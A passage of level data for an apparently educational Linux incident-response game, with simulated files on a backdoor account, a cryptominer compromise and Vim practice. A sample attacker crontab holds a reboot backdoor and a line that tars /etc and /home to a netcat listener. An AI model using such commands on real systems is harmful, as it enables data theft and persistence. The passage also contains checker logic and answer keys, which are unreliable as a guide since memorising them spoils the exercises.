━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PASSWD -S - Password Status
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
passwd -S username

  -S means "status" (uppercase S!)

Output format:
  admin P 01/15/2026 0 99999 7 -1 -1
  │     │ │          │ │     │ │  │
  │     │ │          │ │     │ │  └─ expiration date (-1=never)
  │     │ │          │ │     │ └─ inactive days (-1=never)
  │     │ │          │ │     └─ warning days before expire
  │     │ │          │ └─ max days between changes (99999=never)
  │     │ │          └─ min days between changes
  │     │ └─ last password change date
  │     └─ status: P=password set, L=locked, NP=no password
  └─ username

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
GROUPS COMMAND - User's Groups
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
groups [username]

  groups          → shows YOUR groups
  groups admin    → shows admin's groups

Example output:
  admin : admin sudo docker adm

This tells you what permissions the user has:
  • sudo group = can run sudo commands
  • docker group = can run containers
  • adm group = can read log files

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
QUICK REFERENCE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
cat file | cut -d: -f1    Extract field 1 using : as separator
getent passwd user        Look up user in passwd database
grep -v pattern file      Show lines NOT matching pattern
passwd -S user            Show password status (uppercase S)
groups user               Show user's group memberships
chage -l user             Show password aging details`
                },
                '/home/admin/user_audit/README.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 512,
                    content: `USER AUDIT WORKSPACE
====================
Incident: IR-2026-0119
Task: Identify rogue user accounts

Files:
- COMMAND_REFERENCE.txt: Command syntax explained ← READ THIS FIRST!
- user_list.txt: Current system users with notes
- group_memberships.txt: Privileged group memberships
- suspicious_accounts.txt: Accounts flagged for review

Priority: Find the backdoor account created by attacker
UID range 1000-65533 = regular users (investigate these)

TIP: Commands like "cut -d: -f1" look complex but make sense
once you understand the syntax. See COMMAND_REFERENCE.txt`
                },
                '/home/admin/user_audit/user_list.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 512,
                    content: `SYSTEM USERS AUDIT
==================
Account          UID    Shell           Created
-------          ---    -----           -------
root             0      /bin/bash       System
daemon           1      /usr/sbin/nologin   System
bin              2      /usr/sbin/nologin   System
admin            1000   /bin/bash       2025-06-01
svcaccount       1001   /bin/bash       2025-06-15
developer        1002   /bin/bash       2025-08-20
s3rv1c3          1003   /bin/bash       2026-01-15
guest            1004   /usr/sbin/nologin   2025-06-01
mysql            27     /bin/false      System
www-data         33     /usr/sbin/nologin   System

NOTE: Compare creation dates with incident timeline (2026-01-15)`
                },
                '/home/admin/user_audit/group_memberships.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 512,
                    content: `PRIVILEGED GROUP MEMBERSHIPS
=============================
Baseline (2025-12-01):
- sudo: admin
- docker: admin, developer
- wheel: admin
- adm: admin, svcaccount

Current (2026-01-19):
- sudo: admin, s3rv1c3
- docker: admin, developer
- wheel: admin
- adm: admin, svcaccount

CHANGES DETECTED:
- sudo group: +1 member since baseline

ACTION: Identify which account was added to sudo group
and determine if it was authorized.`
                },
                '/home/admin/user_audit/suspicious_accounts.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 640,
                    content: `BACKDOOR ACCOUNT INDICATORS
===========================
Attackers often create accounts for persistent access.

WHAT TO LOOK FOR:
1. Accounts created during incident window (2026-01-15)
2. Unexpected sudo group membership
3. Unusual naming patterns (leet-speak, typosquatting)
4. Accounts with no corresponding HR/ticket record
5. SSH keys in home directory

INVESTIGATION STEPS:
1. cat /etc/passwd | cut -d: -f1    # List all accounts
2. grep sudo /etc/group             # Who has sudo?
3. Check user_list.txt for creation dates
4. Cross-reference with group_memberships.txt

HINT: Attackers sometimes disguise accounts as service accounts.
Look for accounts that look like "service" but aren't spelled right.`
                },
                '/home/admin/scripts': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'admin', group: 'admin',
                    children: ['add_user.sh', 'audit_users.sh', 'disable_user.sh']
                },
                '/home/admin/scripts/add_user.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'admin', group: 'admin', size: 256,
                    content: '#!/bin/bash\n# Safe user creation script\n# Usage: ./add_user.sh username\n\nif [ -z "$1" ]; then\n  echo "Usage: $0 username"\n  exit 1\nfi\n\nuseradd -m -s /bin/bash "$1"\npasswd "$1"\necho "User $1 created"'
                },
                '/home/admin/scripts/audit_users.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'admin', group: 'admin', size: 384,
                    content: '#!/bin/bash\n# User audit script\necho "=== USERS WITH LOGIN SHELLS ==="\ngrep -v nologin /etc/passwd | grep -v /bin/false\necho ""\necho "=== SUDO GROUP MEMBERS ==="\ngetent group sudo\necho ""\necho "=== RECENT LOGINS ==="\nlastlog | grep -v "Never logged in" | head -10'
                },
                '/home/admin/scripts/disable_user.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'admin', group: 'admin', size: 256,
                    content: '#!/bin/bash\n# Disable user account safely\nif [ -z "$1" ]; then\n  echo "Usage: $0 username"\n  exit 1\nfi\n\nusermod -L "$1"\nusermod -s /usr/sbin/nologin "$1"\necho "User $1 disabled"'
                },
                '/home/admin/evidence': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'admin', group: 'admin',
                    children: ['passwd_snapshot.txt', 'shadow_hashes.txt', 'timeline.txt']
                },
                '/home/admin/evidence/passwd_snapshot.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 768,
                    content: `PASSWD FILE SNAPSHOT - 2026-01-19
==================================
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
admin:x:1000:1000:Administrator:/home/admin:/bin/bash
svcaccount:x:1001:1001:Service Account:/home/svcaccount:/bin/bash
developer:x:1002:1002:Developer:/home/developer:/bin/bash
s3rv1c3:x:1003:1003::/home/s3rv1c3:/bin/bash
guest:x:1004:1004:Guest:/home/guest:/usr/sbin/nologin`
                },
                '/home/admin/evidence/shadow_hashes.txt': {
                    type: 'file', perms: '-rw-------', owner: 'admin', group: 'admin', size: 256,
                    content: `SHADOW ANALYSIS (hashes redacted)
==================================
s3rv1c3 password analysis:
- Hash type: $6$ (SHA-512)
- Last changed: 2026-01-15 (day of compromise)
- Expires: Never
- Account status: Active

NOTE: Password was set when account created
Likely a known credential for attacker access`
                },
                '/home/admin/evidence/timeline.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 512,
                    content: `ACCOUNT CREATION TIMELINE
=========================
Correlated with dpkg.log and auth.log:

2026-01-15 02:47:33 - ncat installed
2026-01-15 02:48:15 - socat installed
2026-01-15 02:51:07 - netminer installed
2026-01-15 02:52:33 - s3rv1c3 account created  <<<
2026-01-15 02:52:45 - s3rv1c3 added to sudo group
2026-01-15 02:53:01 - SSH key added to s3rv1c3

CONCLUSION: Account created for persistent backdoor access
exactly 1 minute after malware installation.`
                },
                '/etc/passwd': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 768,
                    content: `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
admin:x:1000:1000:Administrator:/home/admin:/bin/bash
svcaccount:x:1001:1001:Service Account:/home/svcaccount:/bin/bash
developer:x:1002:1002:Developer:/home/developer:/bin/bash
s3rv1c3:x:1003:1003::/home/s3rv1c3:/bin/bash
guest:x:1004:1004:Guest:/home/guest:/usr/sbin/nologin`
                },
                '/etc/group': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 384,
                    content: `root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:admin,svcaccount
sudo:x:27:admin,s3rv1c3
www-data:x:33:
docker:x:999:admin,developer
admin:x:1000:
svcaccount:x:1001:
developer:x:1002:
s3rv1c3:x:1003:
guest:x:1004:`
                },
                '/etc/shells': {
                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 128,
                    content: `/bin/sh
/bin/bash
/usr/bin/bash
/bin/rbash
/usr/bin/rbash
/bin/dash
/usr/bin/dash
/usr/bin/zsh`
                },
            },

            objectives: [
                { id: 1, task: 'LIST: User Accounts', hint: '$ cat /etc/passwd | cut -d: -f1',
                  check: (cmd, state, output) => cmd.includes('passwd') &&
                         output && (output.includes('root') || output.includes('admin') || output.includes('s3rv1c3')) },
                { id: 2, task: 'CHECK: User Details', hint: '$ getent passwd s3rv1c3',
                  check: (cmd, state, output) => (cmd.includes('getent') || cmd.includes('id ')) &&
                         output && (output.includes('1003') || output.includes('/home/') || output.includes(':x:')) },
                { id: 3, task: 'LIST: Group Memberships', hint: '$ groups admin (or cat /etc/group)',
                  check: (cmd, state, output) => (cmd.includes('groups') || (cmd.includes('cat') && cmd.includes('group'))) &&
                         output && (output.includes('sudo') || output.includes('admin') || output.includes('docker')) },
                { id: 4, task: 'CHECK: Password Status', hint: '$ passwd -S admin (or chage -l)',
                  check: (cmd, state, output) => ((cmd.includes('passwd') && (cmd.includes('-S') || cmd.includes('-s'))) || cmd.includes('chage')) &&
                         output && (output.includes('Password') || output.includes('Last') || output.includes('Expire') || /\b[PL]\s+\d{2}\/\d{2}\/\d{4}\b/.test(output)) },
                { id: 5, task: 'AUDIT: Login Shells', hint: '$ grep -v nologin /etc/passwd',
                  check: (cmd, state, output) => (cmd.includes('shells') || cmd.includes('nologin') || cmd.includes('/bin/bash')) &&
                         output && (output.includes('bash') || output.includes('/bin/sh') || output.includes('admin')) },
            ],

            insightPhase: {
                enabled: true,
                question: "You found an account added to the sudo group that wasn't in the baseline. What is the username of this backdoor account?",
                hint: "Compare group_memberships.txt baseline vs current. The extra sudo member was created on the incident date. Check user_list.txt for accounts created 2026-01-15.",
                hintAfterAttempts: 3,
                acceptedAnswers: ['s3rv1c3'],
                correctAnswerMessage: 'Intel confirmed. Backdoor account s3rv1c3 identified — persistence mechanism documented.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-028: System Monitoring
        // Theme: Real-time system analysis
        // ──────────────────────────────────────────────────────────
        'CLH-028': {
            title: 'System Monitoring',
            description: 'Monitor system resources and detect anomalies.',
            prerequisites: ['CLH-027'],
            tier: 'CLI Ghost',
            user: 'monitor',
            hostname: 'OPS-CENTER',
            startDir: '/home/monitor',
            allowedCommands: null,

            filesystem: {
                '/home/monitor': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'monitor', group: 'monitor',
                    children: ['dashboards', 'alerts', 'scripts', 'reports', '.bashrc', '.bash_history', '.monitoring_cheatsheet']
                },
                '/home/monitor/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'monitor', group: 'monitor', size: 312,
                    content: `ps aux
ps aux | head -20
ps aux --sort=-%cpu | head
top
htop
free -h
vmstat 1 5
iostat -x 1 3
df -h
du -sh /var/log/*
cat /proc/loadavg
uptime
cat alerts/suspicious_proc.txt | grep -i miner
`
                },
                '/home/monitor/.monitoring_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 1024,
                    content: `MONITORING CHEATSHEET
=====================

PROCESS COMMANDS:
  ps aux                   # All processes with details
  ps aux --sort=-%cpu      # Sort by CPU (highest first)
  ps aux --sort=-%mem      # Sort by memory
  ps -ef --forest          # Process tree view
  top                      # Real-time process viewer
  htop                     # Interactive process viewer

MEMORY COMMANDS:
  free -h                  # Human-readable memory info
  cat /proc/meminfo        # Detailed memory stats
  vmstat 1 5               # Virtual memory stats (1 sec, 5 times)

DISK COMMANDS:
  df -h                    # Disk space usage
  du -sh /*                # Directory sizes
  iostat -x               # I/O statistics
  iotop                    # Real-time I/O monitor

CPU COMMANDS:
  cat /proc/loadavg        # Load averages
  uptime                   # System uptime and load
  mpstat                   # CPU statistics

THREAT INDICATORS:
  - Process using >90% CPU = potential cryptominer
  - Unknown process in /tmp = suspicious
  - Netcat (nc) with persistent connection = possible C2
  - Outbound to port 4444 = common C2/meterpreter port
  - @reboot in crontab = persistence mechanism

NETWORK COMMANDS:
  netstat -tunapl          # All connections with PIDs
  ss -tunapl               # Modern netstat alternative
  lsof -i                  # List open network files
`
                },
                '/home/monitor/dashboards': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'monitor', group: 'monitor',
                    children: ['cpu_history.log', 'memory_history.log', 'network_io.log', 'process_count.log']
                },
                '/home/monitor/dashboards/cpu_history.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 512,
                    content: `CPU HISTORY LOG - OPS-CENTER
=============================
2026-01-17 08:00  NORMAL    12% avg
2026-01-17 09:00  NORMAL    15% avg
2026-01-17 10:00  NORMAL    18% avg
2026-01-17 11:00  WARNING   45% avg (spike detected)
2026-01-17 12:00  CRITICAL  95% avg (ALERT TRIGGERED)
2026-01-17 13:00  CRITICAL  97% avg (cryptominer active)
`
                },
                '/home/monitor/dashboards/memory_history.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 384,
                    content: `MEMORY HISTORY LOG - OPS-CENTER
================================
2026-01-17 08:00  2.1GB / 8GB  (26%)
2026-01-17 09:00  2.3GB / 8GB  (29%)
2026-01-17 10:00  2.8GB / 8GB  (35%)
2026-01-17 11:00  4.2GB / 8GB  (52%) - WARNING
2026-01-17 12:00  6.8GB / 8GB  (85%) - CRITICAL
`
                },
                '/home/monitor/dashboards/network_io.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 384,
                    content: `NETWORK I/O LOG - OPS-CENTER
=============================
2026-01-17 10:00  INBOUND: 192.168.1.1:443 - 2MB/hr (normal HTTPS)
2026-01-17 10:30  OUTBOUND: 8.8.8.8:53 - 0.1MB/hr (DNS, normal)
2026-01-17 11:00  OUTBOUND: mining.pool.xxx:3333 - 2MB/hr (PID 6666)
2026-01-17 11:45  OUTBOUND: 10.0.0.88:4444 - 15MB/hr (PID 7777)
2026-01-17 12:00  OUTBOUND: 10.0.0.88:4444 - 45MB/hr (PID 7777)
2026-01-17 12:30  OUTBOUND: 10.0.0.88:4444 - 62MB/hr (PID 7777)

NOTE: PID 7777 maintaining persistent connection. Investigate.
`
                },
                '/home/monitor/dashboards/process_count.log': {
                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 256,
                    content: `PROCESS COUNT LOG
=================
Normal baseline: 85-110 processes
2026-01-17 11:00: 112 processes (+2 unknown)
Unknown PIDs: 6666 (xmrig), 7777 (nc)
`
                },
                '/home/monitor/alerts': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'monitor', group: 'monitor',
                    children: ['high_cpu.txt', 'suspicious_proc.txt', 'network_anomaly.txt', 'README.txt']
                },
                '/home/monitor/alerts/README.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 256,
                    content: `ALERT SYSTEM README
===================
Alerts are generated automatically when thresholds exceed:
- CPU > 80% for 5+ minutes
- Memory > 85%
- Unknown processes spawn
- Outbound connections to non-whitelisted IPs

Review suspicious_proc.txt for current threats.
`
                },
                '/home/monitor/alerts/suspicious_proc.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 512,
                    content: `SUSPICIOUS PROCESSES DETECTED
==============================
*** ROGUE PID IDENTIFIED: 6666 ***

PID 6666 - xmrig (cryptominer) - 95% CPU
  └── Parent: unknown (possible rootkit)
  └── Location: /tmp/.hidden/xmrig
  └── Connection: mining.pool.xxx:3333

PID 7777 - nc (netcat) - Persistent connection
  └── Destination: 10.0.0.88:4444 (C2 server)
  └── Duration: 3 hours continuous

PID 8888 - /tmp/.hidden/backdoor
  └── Persistence: cron @reboot
  └── Function: Reverse shell

ACTION: Investigate PID 6666 immediately
`
                },
                '/home/monitor/alerts/high_cpu.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 384,
                    content: `HIGH CPU ALERT
==============
Timestamp: 2026-01-17 12:00:00
Threshold: 80%
Current: 97%

Top Offenders:
1. xmrig (PID 6666) - 95.2% - CRYPTOMINER DETECTED
2. backdoor (PID 8888) - 1.2%
3. nc (PID 7777) - 0.8%

Recommendation: Terminate PID 6666 and investigate origin
`
                },
                '/home/monitor/alerts/network_anomaly.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 384,
                    content: `NETWORK ANOMALY ALERT
=====================
Detected: Persistent outbound connection to non-whitelisted host

Source Process: PID 7777
Protocol: TCP
Duration: Persistent (3+ hours)
Data transferred: 62MB
Pattern: Matches C2 beacon behavior

NOTE: Full connection details in network_io.log
Correlate with process list to identify destination.
`
                },
                '/home/monitor/scripts': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'monitor', group: 'monitor',
                    children: ['check_cpu.sh', 'kill_miners.sh']
                },
                '/home/monitor/scripts/check_cpu.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'monitor', group: 'monitor', size: 256,
                    content: `#!/bin/bash
# check_cpu.sh - Find high CPU processes
echo "=== TOP CPU CONSUMERS ==="
ps aux --sort=-%cpu | head -10
echo ""
echo "=== LOAD AVERAGE ==="
cat /proc/loadavg
`
                },
                '/home/monitor/scripts/kill_miners.sh': {
                    type: 'file', perms: '-rwxr-xr-x', owner: 'monitor', group: 'monitor', size: 256,
                    content: `#!/bin/bash
# kill_miners.sh - Terminate known cryptominer processes
# WARNING: Requires root privileges
MINERS="xmrig minerd cpuminer"
for miner in $MINERS; do
    pkill -9 $miner && echo "Killed: $miner"
done
`
                },
                '/home/monitor/reports': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'monitor', group: 'monitor',
                    children: ['daily_summary.txt', 'incident_report.txt']
                },
                '/home/monitor/reports/daily_summary.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 384,
                    content: `DAILY MONITORING SUMMARY
========================
Date: 2026-01-17
System: OPS-CENTER

Status: COMPROMISED
Alerts: 4 CRITICAL
Incidents: 1 (cryptominer + C2)

Rogue PID: 6666
Action Required: IMMEDIATE

Summary: System compromised by cryptominer at 11:00.
C2 channel established via netcat. Backdoor persistence detected.
`
                },
                '/home/monitor/reports/incident_report.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 512,
                    content: `INCIDENT REPORT - IR-2026-0117-001
===================================
Classification: HIGH

INDICATORS OF COMPROMISE:
1. Cryptominer (xmrig) - PID 6666
2. C2 Channel (netcat) - PID 7777
3. Backdoor persistence - PID 8888

TIMELINE:
11:00 - Initial compromise (unknown vector)
11:05 - xmrig deployed, CPU spike
11:10 - C2 channel established
11:15 - Backdoor installed in cron

ROOT CAUSE: Under investigation
`
                },
                '/home/monitor/.bashrc': {
                    type: 'file', perms: '-rw-r--r--', owner: 'monitor', group: 'monitor', size: 128,
                    content: '# Monitor .bashrc\nexport PS1="[monitor@OPS-CENTER]$ "\nalias ll="ls -la"\nalias topcpu="ps aux --sort=-%cpu | head"\n'
                },
                '/var/spool/cron/crontabs/nobody': {
                    type: 'file', perms: '-rw-------', owner: 'nobody', group: 'crontab', size: 256,
                    content: `# Malicious crontab installed by attacker
# DO NOT EDIT - this is evidence for incident response

# Persistence mechanism - backdoor starts on every reboot
@reboot /tmp/.hidden/backdoor -d -p 4444 >/dev/null 2>&1

# Cryptominer restarts every hour in case it gets killed
0 * * * * /tmp/.hidden/xmrig --config=/tmp/.hidden/config.json >/dev/null 2>&1

# Exfiltrate data daily at 3am
0 3 * * * tar czf - /etc /home | nc 10.0.0.88 9999
`
                },
            },

            objectives: [
                { id: 1, task: 'RECON: Assess System Health', hint: 'Run: uptime', check: (cmd, state, output) => cmd.includes('uptime') && output && output.includes('load average') },
                { id: 2, task: 'TRIAGE: Sort Processes by CPU', hint: 'Run: ps aux --sort=-%cpu', check: (cmd, state, output) => cmd.includes('ps') && cmd.includes('sort') && cmd.includes('cpu') },
                { id: 3, task: 'MEMORY: Check Resource Impact', hint: 'Run: free -h (is memory being consumed?)', check: (cmd, state, output) => cmd.includes('free') && output && (output.includes('Mem') || output.includes('used')) },
                { id: 4, task: 'NETWORK: Check Active Connections', hint: 'Run: netstat -tunapl (or ss -tunapl)', check: (cmd, state, output) => (cmd.includes('netstat') || cmd.includes('ss')) && output && (output.includes('ESTABLISHED') || output.includes('LISTEN')) },
                { id: 5, task: 'TIMELINE: Find Compromise Start', hint: 'Run: cat dashboards/cpu_history.log', check: (cmd, state, output) => output && output.includes('11:00') && output.includes('spike') },
                { id: 6, task: 'INTEL: Identify C2 Server IP', hint: 'Run: cat dashboards/network_io.log (look for PID 7777)', check: (cmd, state, output) => output && output.includes('10.0.0.88') },
                { id: 7, task: 'CORRELATE: Review Incident Timeline', hint: 'Run: cat reports/incident_report.txt', check: (cmd, state, output) => output && output.includes('TIMELINE') && output.includes('11:05') },
                { id: 8, task: 'PERSIST: Check Backdoor Mechanism', hint: 'Run: cat alerts/suspicious_proc.txt (or check crontab)', check: (cmd, state, output) => output && (output.includes('@reboot') || output.includes('cron') || output.includes('persistence')) },
            ],

            insightPhase: {
                enabled: true,
                question: "The alerts mention PID 7777 has a persistent connection. What is the C2 server's IP:PORT that this process is connecting to?",
                hint: "Check dashboards/network_io.log for PID 7777's connection destination.",
                hintAfterAttempts: 2,
                acceptedAnswers: ['10.0.0.88:4444'],
                correctAnswerMessage: 'Intel confirmed. C2 server at 10.0.0.88:4444 identified — threat indicators logged.',
                wrongAnswerMessage: 'Negative. Review your findings and try again.',
            },

            remoteHosts: null,
        },

        // ──────────────────────────────────────────────────────────
        // CLH-029: Vim Essentials
        // Theme: Essential editor skills for field operations
        // ──────────────────────────────────────────────────────────
        'CLH-029': {
            title: 'Vim Essentials',
            description: 'Master the essential text editor for field operations.',
            prerequisites: ['CLH-028'],
            tier: 'CLI Ghost',
            user: 'operator',
            hostname: 'FIELD-OPS',
            startDir: '/home/operator',
            allowedCommands: null,

            filesystem: {
                '/home/operator': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['training', 'configs', 'missions', 'scripts', '.vimrc', '.bashrc', '.bash_history', '.vim_cheatsheet']
                },
                '/home/operator/.bash_history': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 256,
                    content: `vim training/practice.txt
cat .vimrc
vim configs/network.conf
vim missions/op_serpent.txt
cat .vim_cheatsheet
vim --version
ls -la
cat training/vim_modes.txt
`
                },
                '/home/operator/.vim_cheatsheet': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 1536,
                    content: `VIM SURVIVAL CHEATSHEET
=======================
Field Operatives Edition - MEMORIZE THIS

MODES:
  i     = Insert mode (type text)
  ESC   = Return to Normal mode
  v     = Visual mode (select text)
  :     = Command mode

NAVIGATION (Normal mode):
  h j k l  = left/down/up/right
  w        = next word
  b        = previous word
  0        = start of line
  $        = end of line
  gg       = top of file
  G        = bottom of file
  :42      = go to line 42

EDITING:
  dd    = delete line
  yy    = copy (yank) line
  p     = paste after cursor
  u     = undo
  Ctrl+r = redo
  x     = delete character
  r     = replace character

SAVE & QUIT:
  :w    = save (write)
  :q    = quit
  :wq   = save and quit
  :q!   = quit without saving (force)
  ZZ    = save and quit (shortcut)

SEARCH:
  /pattern  = search forward
  ?pattern  = search backward
  n         = next match
  N         = previous match

FIELD TIP: If vim freezes, you pressed Ctrl+S
Fix: Press Ctrl+Q to unfreeze

FIELD VERIFICATION:
Your handler will request an escape sequence.
The code is stored in your personal vim configuration file.
`
                },
                '/home/operator/.vimrc': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 512,
                    content: `" Field Operator .vimrc
" Optimized for stealth operations

set number           " Show line numbers
syntax on            " Enable syntax highlighting
set tabstop=4        " Tab = 4 spaces
set autoindent       " Auto-indent new lines
set hlsearch         " Highlight search results
set incsearch        " Incremental search
set nobackup         " No backup files (OPSEC)
set noswapfile       " No swap files (leave no trace)
set encoding=utf-8   " UTF-8 encoding

" Custom key mappings
nnoremap <leader>w :w<CR>
nnoremap <leader>q :q<CR>

" Handler verification - escape sequence
" let g:field_verification = "VIMLOCK"
" (Vim Is My Lock On Chaos Key)
`
                },
                '/home/operator/.bashrc': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 128,
                    content: '# Operator .bashrc\nexport PS1="[operator@FIELD-OPS]$ "\nexport EDITOR=vim\nalias vi="vim"\nalias ll="ls -la"\n'
                },
                '/home/operator/training': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['practice.txt', 'mission_template.txt', 'vim_modes.txt', 'README.txt']
                },
                '/home/operator/training/README.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 384,
                    content: `VIM TRAINING DIRECTORY
======================
Welcome to vim training, operative.

Why vim?
- Available on EVERY Linux/Unix system
- Works over low-bandwidth SSH connections
- Leaves no GUI traces
- Fast once mastered

Start with practice.txt, then read vim_modes.txt.
Check your .vim_cheatsheet for quick reference.
`
                },
                '/home/operator/training/practice.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 512,
                    content: `VIM PRACTICE FILE
=================
Line 1: The quick brown fox
Line 2: jumps over the lazy dog
Line 3: Pack my box with five dozen
Line 4: liquor jugs
Line 5: How vexingly quick daft zebras jump

EXERCISES:
1. Navigate to line 4 using :4
2. Delete line 4 using dd
3. Undo with u
4. Search for "fox" using /fox
5. Go to end of file with G
6. Save and quit with :wq

Practice until these are muscle memory.
`
                },
                '/home/operator/training/mission_template.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 384,
                    content: `MISSION REPORT TEMPLATE
=======================
OPERATION: [NAME]
DATE: [YYYY-MM-DD]
HANDLER: [CODENAME]

OBJECTIVE:
[Describe mission objective]

EXECUTION:
[Step-by-step account]

OUTCOME:
[ ] SUCCESS
[ ] PARTIAL
[ ] COMPROMISED

NOTES:
[Additional observations]
`
                },
                '/home/operator/training/vim_modes.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 640,
                    content: `VIM MODES EXPLAINED
===================

NORMAL MODE (default):
  - Navigation and commands
  - Press ESC to return here
  - Most time spent here when skilled

INSERT MODE:
  - Press 'i' to enter
  - Type text normally
  - Press ESC to exit

VISUAL MODE:
  - Press 'v' to enter
  - Select text with movement keys
  - Operations affect selected text

COMMAND MODE:
  - Press ':' to enter
  - Type commands like :wq, :q!, :set number
  - Press ENTER to execute

TIP: If lost, press ESC multiple times to return to Normal mode.
`
                },
                '/home/operator/configs': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['network.conf', 'services.conf', 'ssh_config']
                },
                '/home/operator/configs/network.conf': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 256,
                    content: `# Network Configuration
# Field Operations Server

INTERFACE=eth0
IP_ADDRESS=10.0.0.42
SUBNET_MASK=255.255.255.0
GATEWAY=10.0.0.1
DNS_PRIMARY=8.8.8.8
DNS_SECONDARY=1.1.1.1

# Proxy settings for covert ops
PROXY_ENABLED=true
PROXY_HOST=proxy.field-ops.local
PROXY_PORT=8080
`
                },
                '/home/operator/configs/services.conf': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 256,
                    content: `# Services Configuration

[SSH]
Port=22
PermitRootLogin=no
PasswordAuthentication=no

[HTTP]
Port=80
SSL_Port=443

[VPN]
Port=1194
Protocol=UDP
`
                },
                '/home/operator/configs/ssh_config': {
                    type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 256,
                    content: `# SSH Client Config
Host handler
    HostName 10.0.0.1
    User specter
    IdentityFile ~/.ssh/id_ed25519

Host *
    ServerAliveInterval 60
    AddKeysToAgent yes
`
                },
                '/home/operator/missions': {
                    type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator',
                    children: ['op_serpent.txt', 'mission_log.txt']
                },
                '/home/operator/missions/op_serpent.txt': {
                    type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 512,
                    content: `OPERATION SERPENT
=================
Classification: SECRET

STATUS: DRAFT - NEEDS EDITING

Objective: Infiltrate target network
Timeline: 72 hours

Phase 1: Reconnaissance (complete)
Phase 2: Initial access (in progress)
